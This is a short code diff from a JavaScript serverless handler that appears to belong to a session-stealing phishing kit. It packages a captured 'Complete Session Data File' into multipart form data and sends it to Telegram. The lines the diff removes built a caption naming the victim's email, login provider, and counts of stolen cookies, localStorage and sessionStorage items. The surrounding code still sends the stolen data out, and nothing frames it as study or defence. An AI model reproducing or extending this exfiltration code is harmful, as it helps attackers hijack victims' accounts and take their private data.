@@ -214,15 +214,6 @@ export const handler = async (event, context) => {
       formData += fileContent;
       formData += `\r\n`;
       
-      formData += `--${boundary}\r\n`;
-      formData += `Content-Disposition: form-data; name="caption"\r\n\r\n`;
-      formData += `📁 Complete Session Data File\n\n👤 ${email}\n🔧 ${provider}\n📄 ${fileName}\n🍪 ${cookieCount} cookies\n💾 ${localStorageCount} localStorage\n🗂 ${sessionStorageCount} sessionStorage`;
-      formData += `\r\n`;
-      
-      formData += `--${boundary}\r\n`;
-      formData += `Content-Disposition: form-data; name="parse_mode"\r\n\r\n`;
-      formData += `HTML\r\n`;
-      
       formData += `--${boundary}--\r\n`;
 
       // Send the file to Telegram
